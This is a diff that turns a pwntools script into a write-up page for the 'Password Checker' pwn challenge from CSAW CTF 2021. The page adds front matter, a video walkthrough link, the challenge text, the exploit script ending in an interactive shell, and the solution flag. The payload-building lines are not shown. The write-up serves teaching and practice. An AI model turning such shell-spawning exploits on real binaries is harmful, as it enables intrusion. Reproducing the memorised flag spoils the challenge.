@@ -1,5 +1,35 @@
-from pwn import *
+---
+name: Password Checker (2021)
+event: CSAW CTF 2021
+category: Pwn
+description: Writeup for Password Checker (pwn) - CSAW CTF (2021) 💜
+layout:
+    title:
+        visible: true
+    description:
+        visible: true
+    tableOfContents:
+        visible: false
+    outline:
+        visible: true
+    pagination:
+        visible: true
+---
 
+# Password Checker
+
+## Video Walkthrough
+
+[![VIDEO](https://img.youtube.com/vi/1Dw21NoxXjE/0.jpg)](https://youtu.be/1Dw21NoxXjE?t=315s "CSAW 2021: Password Checker")
+
+## Challenge Description
+
+> Charlie forgot his password to login into his Office portal. Help him to find it.
+
+## Solution
+
+```py
+from pwn import *
 
 # Allows you to switch between local/GDB/remote from terminal
 def start(argv=[], *a, **kw):
@@ -10,13 +40,11 @@ def start(argv=[], *a, **kw):
     else:  # Run locally
         return process([exe] + argv, *a, **kw)
 
-
 # Specify GDB script here (breakpoints etc)
 gdbscript = '''
 init-pwndbg
 continue
 '''.format(**locals())
-
 
 # Binary filename
 exe = './password_checker'
@@ -49,3 +77,6 @@ io.sendlineafter('>', payload)
 
 # Got Shell?
 io.interactive()
+```
+
+Flag: `flag{ch4r1i3_4ppr3ci4t35_y0u_f0r_y0ur_h31p}`
